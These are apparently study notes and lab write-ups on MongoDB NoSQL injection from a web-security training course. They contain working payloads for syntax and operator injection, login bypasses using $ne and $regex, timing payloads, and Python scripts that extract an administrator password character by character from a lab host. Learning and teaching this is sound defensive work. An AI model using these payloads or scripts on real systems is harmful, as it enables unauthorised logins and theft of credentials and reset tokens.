## Types of NoSQL injection

There are two different types of NoSQL injection:

-    Syntax injection - This occurs when you can break the NoSQL query syntax, enabling you to inject your own payload. The methodology is similar to that used in SQL injection. However the nature of the attack varies significantly, as NoSQL databases use a range of query languages, types of query syntax, and different data structures.
-    Operator injection - This occurs when you can use NoSQL query operators to manipulate queries.

### NoSQL syntax injection

You can potentially detect NoSQL injection vulnerabilities by attempting to break the query syntax. To do this, systematically test each input by submitting fuzz strings and special characters that trigger a database error or some other detectable behavior if they're not adequately sanitized or filtered by the application.

If you know the API language of the target database, use special characters and fuzz strings that are relevant to that language. Otherwise, use a variety of fuzz strings to target multiple API languages.


**Detecting syntax injection in MongoDB**

Consider a shopping application that displays products in different categories. When the user selects the Fizzy drinks category, their browser requests the following URL:

`https://insecure-website.com/product/lookup?category=fizzy`

This causes the application to send a JSON query to retrieve relevant products from the product collection in the MongoDB database:

`this.category == 'fizzy'`

To test whether the input may be vulnerable, submit a fuzz string in the value of the category parameter. An example string for MongoDB is:
```
'"`{
;$Foo}
$Foo \xYZ
```
Use this fuzz string to construct the following attack:

`https://insecure-website.com/product/lookup?category='%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00`

If this causes a change from the original response, this may indicate that user input isn't filtered or sanitized correctly.
Note

NoSQL injection vulnerabilities can occur in a variety of contexts, and you need to adapt your fuzz strings accordingly. Otherwise, you may simply trigger validation errors that mean the application never executes your query.

>In this example, we're injecting the fuzz string via the URL, so the string is URL-encoded. In some applications, you may need to inject your payload via a JSON property instead. In this case, this payload would become ``'\"`{\r;$Foo}\n$Foo \\xYZ\u0000``.


**Confirming conditional behavior**

After detecting a vulnerability, the next step is to determine whether you can influence boolean conditions using NoSQL syntax.

To test this, send two requests, one with a false condition and one with a true condition. For example you could use the conditional statements `' && 0 && 'x` and `' && 1 && 'x` as follows:

`https://insecure-website.com/product/lookup?category=fizzy'+%26%26+0+%26%26+'x`
    
`https://insecure-website.com/product/lookup?category=fizzy'+%26%26+1+%26%26+'x`

If the application behaves differently, this suggests that the false condition impacts the query logic, but the true condition doesn't. This indicates that injecting this style of syntax impacts a server-side query.

**Overriding existing conditions**

Now that you have identified that you can influence boolean conditions, you can attempt to override existing conditions to exploit the vulnerability. For example, you can inject a JavaScript condition that always evaluates to true, such as `'||'1'=='1`:

`https://insecure-website.com/product/lookup?category=fizzy%27%7c%7c%27%31%27%3d%3d%27%31`

This results in the following MongoDB query:
`this.category == 'fizzy'||'1'=='1'`

As the injected condition is always true, the modified query returns all items. This enables you to view all the products in any category, including hidden or unknown categories. 

You could also add a null character after the category value. MongoDB may ignore all characters after a null character. This means that any additional conditions on the MongoDB query are ignored. For example, the query may have an additional this.released restriction:
`this.category == 'fizzy' && this.released == 1`

The restriction `this.released == 1` is used to only show products that are released. For unreleased products, presumably `this.released == 0`.

In this case, an attacker could construct an attack as follows:
`https://insecure-website.com/product/lookup?category=fizzy'%00`

This results in the following NoSQL query:
`this.category == 'fizzy'\u0000' && this.released == 1`

If MongoDB ignores all characters after the null character, this removes the requirement for the released field to be set to 1. As a result, all products in the fizzy category are displayed, including unreleased products. 
### Lab: Detecting NoSQL injection

The product category filter for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, perform a NoSQL injection attack that causes the application to display unreleased products.

When I access `/filter?category=Accessories'` path, the web return
```
Command failed with error 139 (JSInterpreterFailure): &apos;SyntaxError: unterminated string literal :
functionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25
&apos; on server 127.0.0.1:27017. The full response is {&quot;ok&quot;: 0.0, &quot;errmsg&quot;: &quot;SyntaxError: unterminated string literal :\nfunctionExpressionParser@src/mongo/scripting/mozjs/mongohelpers.js:46:25\n&quot;, &quot;code&quot;: 139, &quot;codeName&quot;: &quot;JSInterpreterFailure&quot;}
```
To display unrealease product: `/filter?category=Accessories'||'1`

## NoSQL operator injection

NoSQL databases often use query operators, which provide ways to specify conditions that data must meet to be included in the query result. Examples of MongoDB query operators include:

-    $where - Matches documents that satisfy a JavaScript expression.
-    $ne - Matches all values that are not equal to a specified value.
-    $in - Matches all of the values specified in an array.
-    $regex - Selects documents where values match a specified regular expression.

You may be able to inject query operators to manipulate NoSQL queries. To do this, systematically submit different operators into a range of user inputs, then review the responses for error messages or other changes.

### Submitting query operators

In JSON messages, you can insert query operators as nested objects. For example, `{"username":"wiener"}` becomes `{"username":{"$ne":"invalid"}}`.

For URL-based inputs, you can insert query operators via URL parameters. For example, `username=wiener` becomes `username[$ne]=invalid`. If this doesn't work, you can try the following:

-    Convert the request method from GET to POST.
-    Change the Content-Type header to application/json.
-    Add JSON to the message body.
-    Inject query operators in the JSON.

### Detecting operator injection in MongoDB

Consider a vulnerable application that accepts a username and password in the body of a POST request:
`{"username":"wiener","password":"peter"}`

Test each input with a range of operators. For example, to test whether the username input processes the query operator, you could try the following injection:
`{"username":{"$ne":"invalid"},"password":"peter"}`

If the `$ne` operator is applied, this queries all users where the username is not equal to invalid.

If both the username and password inputs process the operator, it may be possible to bypass authentication using the following payload:
`{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}`

This query returns all login credentials where both the username and password are not equal to invalid. As a result, you're logged into the application as the first user in the collection.

To target an account, you can construct a payload that includes a known username, or a username that you've guessed. For example:
`{"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}`
### Lab: Exploiting NoSQL operator injection to bypass authentication
The login functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection using MongoDB operators.

To solve the lab, log into the application as the administrator user.

You can log in to your own account using the following credentials: wiener:peter. 


Change the value of the username parameter from `"wiener"` to `{"$ne":""}`, then send the request. Notice that this enables you to log in.

Change the value of the username parameter from `{"$ne":""}` to `{"$regex":"wien.*"}`, then send the request. Notice that you can also log in when using the `$regex` operator.

With the username parameter set to `{"$ne":""}`, change the value of the password parameter from `"peter"` to `{"$ne":""}`, then send the request again. Notice that this causes the query to return an unexpected number of records. This indicates that more than one user has been selected.

With the password parameter set as `{"$ne":""}`, change the value of the username parameter to `{"$regex":"admin.*"}`, then send the request again. Notice that this successfully logs you in as the admin user.

## Exploiting syntax injection to extract data

In many NoSQL databases, some query operators or functions can run limited JavaScript code, such as MongoDB's `$where` operator and `mapReduce()` function. This means that, if a vulnerable application uses these operators or functions, the database may evaluate the JavaScript as part of the query. You may therefore be able to use JavaScript functions to extract data from the database.
### Exfiltrating data in MongoDB

Consider a vulnerable application that allows users to look up other registered usernames and displays their role. This triggers a request to the URL:
`https://insecure-website.com/user/lookup?username=admin`

This results in the following NoSQL query of the users collection:
`{"$where":"this.username == 'admin'"}`

As the query uses the `$where` operator, you can attempt to inject JavaScript functions into this query so that it returns sensitive data. For example, you could send the following payload:
`admin' && this.password[0] == 'a' || 'a'=='b`

This returns the first character of the user's password string, enabling you to extract the password character by character.

You could also use the JavaScript `match()` function to extract information. For example, the following payload enables you to identify whether the password contains digits:
`admin' && this.password.match(/\d/) || 'a'=='b` 

### Identifying field names

Because MongoDB handles semi-structured data that doesn't require a fixed schema, you may need to identify valid fields in the collection before you can extract data using JavaScript injection.

For example, to identify whether the MongoDB database contains a password field, you could submit the following payload:
`https://insecure-website.com/user/lookup?username=admin'+%26%26+this.password!%3d'`

Send the payload again for an existing field and for a field that doesn't exist. In this example, you know that the username field exists, so you could send the following payloads:
`admin' && this.username!=' admin' && this.foo!='`

If the password field exists, you'd expect the response to be identical to the response for the existing field (username), but different to the response for the field that doesn't exist (foo).
### Lab: Exploiting NoSQL injection to extract data

The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, extract the password for the administrator user, then log in to their account.

You can log in to your own account using the following credentials: wiener:peter. 

`/user/lookup?user=administrator'&&this.password.length<100||'1'=='2` return
```
{
  "username": "administrator",
  "email": "admin@normal-user.net",
  "role": "administrator"
}
```
I use this script to get the password's length
```py
import requests

baseurl = "https://ID.web-security-academy.net"
for len in range(1, 100):
    url = (f"{baseurl}/user/lookup?user=administrator'%26%26this.password.length=={len}||'1'=='2")
    cookies = {"session": "..."}
    response = requests.get(url, cookies=cookies)
    if "administrator" in response.text:
        print(f"Password length: {len}")
        break
```
```
$ python3 solve.py
Password length: 8
```
Finding the password: with `/user/lookup?user=administrator'%26%26this.password[0]=='h` return 
```
{
  "username": "administrator",
  "email": "admin@normal-user.net",
  "role": "administrator"
}
```
So the first character of the password is `h`, I use the following script to find the password
```py
import requests

baseurl = "https://ID.web-security-academy.net"
chars = "abcdefghijklmnopqrstuvwxyz"
password = ""
for pos in range(0, 7):
    for char in chars:
        url = (f"{baseurl}/user/lookup?user=administrator'%26%26this.password[{pos}]=='{char}")
        cookies = {"session": "..."}
        response = requests.get(url, cookies=cookies)
        if "administrator" in response.text:
            print(f"Found character {char} at position {pos}")
            password += char
            break
print(password)
```
## Exploiting NoSQL operator injection to extract data

Even if the original query doesn't use any operators that enable you to run arbitrary JavaScript, you may be able to inject one of these operators yourself. You can then use boolean conditions to determine whether the application executes any JavaScript that you inject via this operator.
### Injecting operators in MongoDB

Consider a vulnerable application that accepts username and password in the body of a POST request:
`{"username":"wiener","password":"peter"}`

To test whether you can inject operators, you could try adding the $where operator as an additional parameter, then send one request where the condition evaluates to false, and another that evaluates to true. For example:
`{"username":"wiener","password":"peter", "$where":"0"}`

`{"username":"wiener","password":"peter", "$where":"1"}`

If there is a difference between the responses, this may indicate that the JavaScript expression in the $where clause is being evaluated.
### Extracting field names

If you have injected an operator that enables you to run JavaScript, you may be able to use the `keys()` method to extract the name of data fields. For example, you could submit the following payload:
`"$where":"Object.keys(this)[0].match('^.{0}a.*')"`

This inspects the first data field in the user object and returns the first character of the field name. This enables you to extract the field name character by character.
### Exfiltrating data using operators

Alternatively, you may be able to extract data using operators that don't enable you to run JavaScript. For example, you may be able to use the `$regex` operator to extract data character by character.

Consider a vulnerable application that accepts a username and password in the body of a POST request. For example:
`{"username":"myuser","password":"mypass"}`

You could start by testing whether the `$regex` operator is processed as follows:
`{"username":"admin","password":{"$regex":"^.*"}}`

If the response to this request is different to the one you receive when you submit an incorrect password, this indicates that the application may be vulnerable. You can use the `$regex` operator to extract data character by character. For example, the following payload checks whether the password begins with an a:
`{"username":"admin","password":{"$regex":"^a*"}} `
### Lab: Exploiting NoSQL operator injection to extract unknown fields

The user lookup functionality for this lab is powered by a MongoDB NoSQL database. It is vulnerable to NoSQL injection.

To solve the lab, log in as carlos.

To solve the lab, you'll first need to exfiltrate the value of the password reset token for the user carlos.


Add `"$where": "0"` as an additional parameter in the JSON data as follows: `{"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}`

Send the request. Notice that you receive an Invalid username or password error message.

Change `"$where": "0"` to `"$where": "1"`, then resend the request. Notice that you receive an Account locked error message. This indicates that the JavaScript in the $where clause is being evaluated.

Update the `$where` parameter as follows: ```"$where":"Object.keys(this)[1].match('^.{}.*')"```

Add two payload positions. The first identifies the character position number, and the second identifies the character itself: `"$where":"Object.keys(this)[1].match('^.{§§}§§.*')"`



Repeat the above steps to identify further JSON parameters. You can do this by incrementing the index of the keys array with each attempt, for example: `"$where":"Object.keys(this)[2].match('^.{}.*')"`

The parameters are: **_id, username, password, email, resetToken**

Update the `$where` parameter as follows to get the token value and change the password: `"$where":"this.resetToken.match('^.{§§}§§.*')"`

## Timing based injection

Sometimes triggering a database error doesn't cause a difference in the application's response. In this situation, you may still be able to detect and exploit the vulnerability by using JavaScript injection to trigger a conditional time delay.

To conduct timing-based NoSQL injection:

-    Load the page several times to determine a baseline loading time.
-    Insert a timing based payload into the input. A timing based payload causes an intentional delay in the response when executed. For example, `{"$where": "sleep(5000)"}` causes an intentional delay of 5000 ms on successful injection.
-    Identify whether the response loads more slowly. This indicates a successful injection.

The following timing based payloads will trigger a time delay if the password beings with the letter a:

`admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'`

`admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'` 